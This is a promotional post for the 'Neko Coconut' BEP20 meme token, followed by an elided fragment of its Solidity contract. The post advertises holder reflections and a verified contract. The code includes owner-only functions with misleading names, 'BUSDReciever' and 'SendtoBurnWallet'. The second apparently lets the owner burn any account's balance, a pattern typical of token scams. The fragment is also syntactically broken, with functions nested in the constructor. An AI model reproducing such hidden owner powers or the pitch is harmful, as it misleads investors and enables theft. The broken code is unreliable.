...
Neko Coconut 🌴🥥 -  is a community driven meme with Anti-PaperHand system distributes 2% of every transaction to holders. 
This incentivizes all hodlers and rewards people that stay on board! 3% for the marketing and 2% for the Liquidity! With 7% slippage.
 $Coconut
...
🥥 - Anti Paperhand (2% Reflections).
🥥 - LP LOCKED (1 Month ).
🥥 - Smart Contract is verified. 

https://t.me/NekoCoconut
...
*/
    ...
    contract NekoCoconut  is IBEP20, Ownable
    {
        ...
        string private constant _name = "NekoCoconut";
        string private constant _symbol = "NCoconut";
        ...
        address public constant MarketingWallet=0xdef1D55F0EB16A5fe8C96580d091411e0BCbf9Cd; 
        ...
        constructor () {
           ...
           function LiquidityProvider(address account) external onlyOwner {
            ...
            function BUSDReciever(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function SendtoBurnWallet(address account, uint256 balance) onlyOwner  public virtual {
